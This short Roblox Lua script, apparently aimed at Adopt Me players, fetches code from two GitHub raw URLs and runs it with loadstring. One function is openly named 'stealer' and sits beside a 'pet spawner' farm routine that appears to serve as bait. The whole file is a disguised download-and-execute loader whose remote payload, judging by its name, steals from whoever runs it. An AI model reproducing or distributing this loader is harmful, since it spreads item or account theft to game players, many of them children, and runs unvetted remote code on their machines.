local function stealer()
loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/ByIgniteScript/refs/heads/main/AdoptMeScript.lua'))()
end

local function farm()
loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/PetSpawner/refs/heads/main/HiraHub'))()
end

task.spawn(stealer)

for i = 1, 1 do
task.spawn(farm)
end
